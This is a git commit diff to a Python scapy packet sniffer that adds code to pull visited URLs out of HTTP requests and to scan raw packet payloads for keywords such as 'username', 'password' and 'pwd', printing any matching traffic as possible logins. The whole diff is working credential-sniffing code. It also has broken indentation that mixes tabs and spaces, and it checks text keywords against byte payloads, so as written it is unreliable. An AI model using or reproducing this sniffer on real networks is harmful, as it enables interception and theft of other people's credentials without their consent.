bdea1843198cbbe32997203b45da91e8adad7a36
virtual-armor <virtualinfoarmor@gmail.com>
2024-09-26 00:02:20 -0500

    Added more functionality to sniff uname, pwd, url

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -7,8 +7,27 @@ def sniff(interface):
 	#Store decides whether to store  packets in memory.
 	sc.sniff(iface=interface, store=False, prn=process_packet)
 
+def get_url(packet):
+	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+	if packet.haslayer(sc.Raw):
+                        load = packet[sc.Raw].load
+                        keywords = ["username", "Username", "login", "password", "Password",
+					"Uname", "uname", "pwd", "PWD", "Pwd"]
+                        for keyword in keywords:
+                                if keyword in load:
+					return load
+
 def process_packet(packet):
 	if packet.haslayer(http.HTTPRequest):
-		print(packet)
-
+		#print(packet.show())
+		url = get_url(packet)
+		print("[+] URLS: ============================================")
+		print(url)
+		load_layer = get_login_info(packet)
+		if load_layer:
+			print("\n\n[+] Possible Usernames and Passwords: =======")
+			print(load_layer + "\n")
+					
 sniff("eth0")
